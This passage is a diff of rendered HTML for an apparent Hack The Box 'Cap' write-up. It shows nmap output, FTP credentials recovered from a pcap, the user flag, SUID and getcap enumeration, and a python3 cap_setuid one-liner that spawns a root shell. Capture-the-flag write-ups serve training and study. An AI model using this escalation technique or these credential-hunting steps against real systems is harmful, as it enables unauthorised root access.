+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:026\x20Jun\x202021\x2015:08:41\x20GMT\r\nConnection:\x20close\r\nConten
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20OPTIONS,\x
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:20GET\r\nContent-Length:\x200\r\n\r\n&amp;#34;)%r(RTSPRequest,121,&amp;#34;HTTP/1\.1\x2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:/html\r\nContent-Length:\x20196\r\n\r\n&amp;lt;html&amp;gt;\n\x20\x20&amp;lt;head&amp;gt;\n\x20\x20
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:\x20\x20&amp;lt;title&amp;gt;Bad\x20Request&amp;lt;/title&amp;gt;\n\x20\x20&amp;lt;/head&amp;gt;\n\x20\x20&amp;lt;body&amp;gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:n\x20\x20\x20\x20&amp;lt;h1&amp;gt;&amp;lt;p&amp;gt;Bad\x20Request&amp;lt;/p&amp;gt;&amp;lt;/h1&amp;gt;\n\x20\x20\x20\x20Invali
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:d\x20HTTP\x20Version\x20&amp;amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;amp;#x27;RTSP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:/1\.0&amp;amp;#x27;&amp;amp;#x27;\n\x20\x20&amp;lt;/body&amp;gt;\n&amp;lt;/html&amp;gt;\n&amp;#34;)%r(FourOhFourRequest,189
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:,&amp;#34;HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20S
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:at,\x2026\x20Jun\x202021\x2015:08:48\x20GMT\r\nConnection:\x20close\r\n
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:r\n\r\n&amp;lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&amp;#34;-//W3C//DTD\x20HTML\x203\.2\x20
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:Final//EN\&amp;#34;&amp;gt;\n&amp;lt;title&amp;gt;404\x20Not\x20Found&amp;lt;/title&amp;gt;\n&amp;lt;h1&amp;gt;Not\x20Found&amp;lt;/h1&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:\n&amp;lt;p&amp;gt;The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20ser
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:ver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20ch
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:eck\x20your\x20spelling\x20and\x20try\x20again\.&amp;lt;/p&amp;gt;\n&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap done: 1 IP address (1 host up) scanned in 136.54 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;About the website serving on port 80.
+The website is about security details related to the server. The Dashboard shows line graph no. of Security events, failed logins and UDP scans. A user named Nathan is logged in and the &amp;rsquo;log-out&amp;rsquo; button doesn&amp;rsquo;t seems to work.&lt;/p&gt;
+&lt;p&gt;There are other 3 pages for &amp;lsquo;5 sec PCAP analysis&amp;rsquo;, &amp;lsquo;ipconfig&amp;rsquo; and &amp;rsquo;network status&amp;rsquo;.&lt;/p&gt;
 &lt;p&gt;PCAP page(&lt;code&gt;http://10.10.10.245/data/27&lt;/code&gt;) shows about the no of packets and there is also a option to download the pcap&lt;/p&gt;
 &lt;p&gt;ipconfig page shows the output of running &lt;code&gt;ipconfig&lt;/code&gt; in that server&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;eth0: flags=4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu 1500
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;eth0: flags=4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu 1500
         inet 10.10.10.245  netmask 255.255.255.0  broadcast 10.10.10.255
         inet6 fe80::250:56ff:feb9:ada2  prefixlen 64  scopeid 0x20&amp;lt;link&amp;gt;
         inet6 dead:beef::250:56ff:feb9:ada2  prefixlen 64  scopeid 0x0&amp;lt;global&amp;gt;
@@ -438,108 +438,108 @@ lo: flags=73&amp;lt;UP,LOOPBACK,RUNNING&amp;gt;  mtu 65536
 &lt;p&gt;On the PCAP page url we are also passing a number may be it is the index as each index stores pcap of 5 seconds. Using Burp Intruder I checked how many indexes are there and what are the no of packets in each of them. There were 32 indexes.
 I rebooted the machine and checked again. Now there are ony 2 indexes. The 0 index have the same details as before. I downloaded the pcap and looked for anything useful.&lt;/p&gt;
 &lt;p&gt;In the file I got a user and password for FTP.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;USER: Nathan
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;USER: Nathan
 PASS: Buck3tH4TF0RM3!
-&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;┌──(kali㉿kali)-[~/HTB/Cap]
-└─$ ftp  10.10.10.245
-Connected to 10.10.10.245.
-220 (vsFTPd 3.0.3)
-Name (10.10.10.245:kali): nathan
-331 Please specify the password.
-Password:
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp&amp;gt; ls
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
--rwxr-xr-x    1 1001     1001        46631 Jul 07  2020 LinEnum.sh
--rwxr-xr-x    1 1001     1001          887 Mar 10 14:03 enum.sh
--rwxr-xr-x    1 1001     1001        84889 Jul 07  2020 les.sh
--rw-rw-r--    1 1001     1001          415 Jul 17 10:29 les.txt
--rw-rw-r--    1 1001     1001       102798 Jul 17 10:28 linEnum.txt
--rw-rw-r--    1 1001     1001       105395 Jul 17 10:28 linpeas.txt
--rwxr-xr-x    1 1001     1001       325865 Mar 10 13:58 linpeasnew.sh
--rwxr-xr-x    1 1001     1001        37195 Jul 07  2020 linuxprivchecker.py
--rw-rw-r--    1 1001     1001        10240 Jul 17 10:30 lpc.tar
--rw-rw-r--    1 1001     1001            0 Jul 17 10:30 lpc.txt
--rwxr-xr-x    1 1001     1001        37909 Jul 07  2020 lse.sh
--rw-rw-r--    1 1001     1001       136262 Jul 17 10:29 lse.txt
--rwxrwxr-x    1 1001     1001        46632 Jul 18 13:34 mm.sh
--rw-rw-r--    1 1001     1001       358400 Jul 17 10:30 privesc.tar
-drwxr-xr-x    3 1001     1001         4096 Jul 17 10:27 snap
--rwsrwxrwx    1 1001     1001           10 Jul 17 11:08 test.sh
--r--------    1 1001     1001           33 Jul 17 10:01 user.txt
-226 Directory send OK.
-ftp&amp;gt; cat user.txt
-?Invalid command
-ftp&amp;gt; get user.txt
-local: user.txt remote: user.txt
-200 PORT command successful. Consider using PASV.
-150 Opening BINARY mode data connection for user.txt (33 bytes).
-226 Transfer complete.
-33 bytes received in 0.00 secs (287.7372 kB/s)
-ftp&amp;gt; exit
-221 Goodbye.
-
-┌──(kali㉿kali)-[~/HTB/Cap]
-└─$ cat user.txt
-fa4fb308e7486ab7ece2b4f2843c7480
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;root-solution&#34;&gt;Root solution&lt;/h2&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──(kali㉿kali)-[~/HTB/Cap]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ ftp  10.10.10.245
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connected to 10.10.10.245.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;220 (vsFTPd 3.0.3)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Name (10.10.10.245:kali): nathan
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;331 Please specify the password.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;230 Login successful.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Remote system type is UNIX.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Using binary mode to transfer files.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ftp&amp;gt; ls
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;200 PORT command successful. Consider using PASV.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;150 Here comes the directory listing.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxr-xr-x    1 1001     1001        46631 Jul 07  2020 LinEnum.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxr-xr-x    1 1001     1001          887 Mar 10 14:03 enum.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxr-xr-x    1 1001     1001        84889 Jul 07  2020 les.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-rw-r--    1 1001     1001          415 Jul 17 10:29 les.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-rw-r--    1 1001     1001       102798 Jul 17 10:28 linEnum.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-rw-r--    1 1001     1001       105395 Jul 17 10:28 linpeas.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxr-xr-x    1 1001     1001       325865 Mar 10 13:58 linpeasnew.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxr-xr-x    1 1001     1001        37195 Jul 07  2020 linuxprivchecker.py
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-rw-r--    1 1001     1001        10240 Jul 17 10:30 lpc.tar
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-rw-r--    1 1001     1001            0 Jul 17 10:30 lpc.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxr-xr-x    1 1001     1001        37909 Jul 07  2020 lse.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-rw-r--    1 1001     1001       136262 Jul 17 10:29 lse.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxrwxr-x    1 1001     1001        46632 Jul 18 13:34 mm.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-rw-r--    1 1001     1001       358400 Jul 17 10:30 privesc.tar
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x    3 1001     1001         4096 Jul 17 10:27 snap
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsrwxrwx    1 1001     1001           10 Jul 17 11:08 test.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-r--------    1 1001     1001           33 Jul 17 10:01 user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;226 Directory send OK.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ftp&amp;gt; cat user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;?Invalid command
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ftp&amp;gt; get user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;local: user.txt remote: user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;200 PORT command successful. Consider using PASV.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;150 Opening BINARY mode data connection for user.txt (33 bytes).
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;226 Transfer complete.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;33 bytes received in 0.00 secs (287.7372 kB/s)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ftp&amp;gt; exit
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;221 Goodbye.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;┌──(kali㉿kali)-[~/HTB/Cap]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ cat user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fa4fb308e7486ab7ece2b4f2843c7480
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;root-solution&#34;&gt;Root solution&lt;/h2&gt;
 &lt;p&gt;The same credentials are also used for ssh.&lt;/p&gt;
 &lt;p&gt;After logging in through ssh I checked for SUID executables.&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;nathan@cap:/$ find / -user root -perm -4000 -print 2&amp;gt;/dev/null
-/usr/bin/umount
-/usr/bin/newgrp
-/usr/bin/pkexec
-/usr/bin/mount
-/usr/bin/gpasswd
-/usr/bin/passwd
-/usr/bin/chfn
-/usr/bin/sudo
-/usr/bin/chsh
-/usr/bin/su
-/usr/bin/fusermount
-/usr/lib/policykit-1/polkit-agent-helper-1
-/usr/lib/snapd/snap-confine
-/usr/lib/openssh/ssh-keysign
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/eject/dmcrypt-get-device
-/snap/snapd/11841/usr/lib/snapd/snap-confine
-/snap/snapd/8542/usr/lib/snapd/snap-confine
-/snap/core18/2066/bin/mount
-/snap/core18/2066/bin/ping
-/snap/core18/2066/bin/su
-/snap/core18/2066/bin/umount
-/snap/core18/2066/usr/bin/chfn
-/snap/core18/2066/usr/bin/chsh
-/snap/core18/2066/usr/bin/gpasswd
-/snap/core18/2066/usr/bin/newgrp
-/snap/core18/2066/usr/bin/passwd
-/snap/core18/2066/usr/bin/sudo
-/snap/core18/2066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/snap/core18/2066/usr/lib/openssh/ssh-keysign
-/snap/core18/1997/bin/mount
-/snap/core18/1997/bin/ping
-/snap/core18/1997/bin/su
-/snap/core18/1997/bin/umount
-/snap/core18/1997/usr/bin/chfn
-/snap/core18/1997/usr/bin/chsh
-/snap/core18/1997/usr/bin/gpasswd
-/snap/core18/1997/usr/bin/newgrp
-/snap/core18/1997/usr/bin/passwd
-/snap/core18/1997/usr/bin/sudo
-/snap/core18/1997/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/snap/core18/1997/usr/lib/openssh/ssh-keysign
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Got nothing interesting from the list. I started looking for any hints in the forum. There was one hint, &amp;lsquo;the machine name is a big hint for all&amp;rsquo;. I searched for &amp;lsquo;Cap linux&amp;rsquo; and got that cap means capabilities in Linux. Then I searched for &amp;lsquo;capabilities linux priv esc&amp;rsquo;. From this article &lt;a href=&#34;https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/&#34;&gt;Linux Privilege Escalation using Capabilities&lt;/a&gt; I got the solution for my next steps.&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;nathan@cap:~$ getcap -r / 2&amp;gt;/dev/null
-/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
-/usr/bin/ping = cap_net_raw+ep
-/usr/bin/traceroute6.iputils = cap_net_raw+ep
-/usr/bin/mtr-packet = cap_net_raw+ep
-/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;cap_setuid enabled for python3. Use this to get root shell.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;nathan@cap:~$ python3 -c &#39;import os; os.setuid(0); os.system(&amp;quot;/bin/bash&amp;quot;)&#39;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nathan@cap:/$ find / -user root -perm -4000 -print 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/umount
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/newgrp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/pkexec
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/mount
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/gpasswd
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/passwd
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/chfn
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/sudo
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/chsh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/su
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/fusermount
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/lib/policykit-1/polkit-agent-helper-1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/lib/snapd/snap-confine
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/lib/openssh/ssh-keysign
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/lib/eject/dmcrypt-get-device
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/snapd/11841/usr/lib/snapd/snap-confine
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/snapd/8542/usr/lib/snapd/snap-confine
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/2066/bin/mount
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/2066/bin/ping
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/2066/bin/su
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/2066/bin/umount
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/2066/usr/bin/chfn
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/2066/usr/bin/chsh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/2066/usr/bin/gpasswd
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/2066/usr/bin/newgrp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/2066/usr/bin/passwd
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/2066/usr/bin/sudo
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/2066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/2066/usr/lib/openssh/ssh-keysign
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/1997/bin/mount
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/1997/bin/ping
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/1997/bin/su
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/1997/bin/umount
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/1997/usr/bin/chfn
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/1997/usr/bin/chsh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/1997/usr/bin/gpasswd
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/1997/usr/bin/newgrp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/1997/usr/bin/passwd
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/1997/usr/bin/sudo
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/1997/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/snap/core18/1997/usr/lib/openssh/ssh-keysign
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Got nothing interesting from the list. I started looking for any hints in the forum. There was one hint, &amp;rsquo;the machine name is a big hint for all&amp;rsquo;. I searched for &amp;lsquo;Cap linux&amp;rsquo; and got that cap means capabilities in Linux. Then I searched for &amp;lsquo;capabilities linux priv esc&amp;rsquo;. From this article &lt;a href=&#34;https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/&#34;&gt;Linux Privilege Escalation using Capabilities&lt;/a&gt; I got the solution for my next steps.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nathan@cap:~$ getcap -r / 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/ping = cap_net_raw+ep
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/traceroute6.iputils = cap_net_raw+ep
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/mtr-packet = cap_net_raw+ep
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;cap_setuid enabled for python3. Use this to get root shell.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nathan@cap:~$ python3 -c &amp;#39;import os; os.setuid(0); os.system(&amp;#34;/bin/bash&amp;#34;)&amp;#39;
 root@cap:~# pwd
 /home/nathan
 root@cap:~# cat /root/root.txt
@@ -559,80 +559,79 @@ Points: 20
 Difficulty: Easy
 ip=10.10.10.242
 User solution The first thing is to do the nmap scan.
